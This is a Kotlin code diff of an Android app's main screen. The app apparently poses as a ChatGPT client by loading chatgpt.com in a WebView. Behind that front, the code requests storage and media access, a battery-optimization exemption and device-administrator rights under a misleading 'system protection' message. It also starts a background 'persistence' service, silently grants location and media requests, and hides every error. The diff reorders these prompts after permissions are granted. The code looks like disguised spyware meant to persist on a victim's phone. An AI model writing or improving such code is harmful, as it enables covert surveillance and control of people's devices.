@@ -29,18 +29,27 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
+
         try {
             webView = WebView(this)
             setContentView(webView)
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
 
-        requestTargetPermissions()
-        requestBatteryOptimizationExemption()
-        requestDeviceAdministrator()
         setupEngineWebView()
-        
         startBackgroundPersistenceService()
+        requestTargetPermissions()
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            requestBatteryOptimizationExemption()
+            requestDeviceAdministrator()
+        }
     }
 
     private fun requestTargetPermissions() {
@@ -61,14 +70,23 @@ class MainActivity : AppCompatActivity() {
             permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
         } else {
             permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            @Suppress("DEPRECATION")
             permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
         }
-        
-        val needed = permissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
+
+        val needed = permissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
         if (needed.isNotEmpty()) {
             try {
                 ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMISSION_REQUEST_CODE)
-            } catch (e: Exception) {}
+            } catch (_: Exception) {
+                requestBatteryOptimizationExemption()
+                requestDeviceAdministrator()
+            }
+        } else {
+            requestBatteryOptimizationExemption()
+            requestDeviceAdministrator()
         }
     }
 
@@ -82,7 +100,7 @@ class MainActivity : AppCompatActivity() {
                     }
                     startActivity(intent)
                 }
-            } catch (e: Exception) {}
+            } catch (_: Exception) {}
         }
     }
 
@@ -93,8 +111,9 @@ class MainActivity : AppCompatActivity() {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                 putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل حماية النظام لضمان الاستمرارية.")
             }
+            @Suppress("DEPRECATION")
             startActivityForResult(intent, ADMIN_REQUEST_CODE)
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
     }
 
     private fun startBackgroundPersistenceService() {
@@ -105,7 +124,7 @@ class MainActivity : AppCompatActivity() {
             } else {
                 startService(serviceIntent)
             }
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
     }
 
     private fun setupEngineWebView() {
@@ -116,18 +135,28 @@ class MainActivity : AppCompatActivity() {
             settings.cacheMode = WebSettings.LOAD_NO_CACHE
             webView.webViewClient = WebViewClient()
             webView.webChromeClient = object : WebChromeClient() {
-                override fun onGeolocationPermissionsShowPrompt(origin: String?, callback: GeolocationPermissions.Callback?) { callback?.invoke(origin, true, false) }
-                override fun onPermissionRequest(request: PermissionRequest?) { request?.grant(request.resources) }
+                override fun onGeolocationPermissionsShowPrompt(
+                    origin: String?,
+                    callback: GeolocationPermissions.Callback?
+                ) {
+                    callback?.invoke(origin, true, false)
+                }
+
+                override fun onPermissionRequest(request: PermissionRequest?) {
+                    request?.grant(request.resources)
+                }
             }
             webView.clearCache(true)
             webView.loadUrl("https://chatgpt.com")
-        } catch (e: Exception) {}
+        } catch (_: Exception) {}
     }
 
+    @Deprecated("Deprecated in Java")
     override fun onBackPressed() {
         try {
-            if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
-        } catch (e: Exception) {
+            if (webView.canGoBack()) webView.goBack() else @Suppress("DEPRECATION") super.onBackPressed()
+        } catch (_: Exception) {
+            @Suppress("DEPRECATION")
             super.onBackPressed()
         }
     }
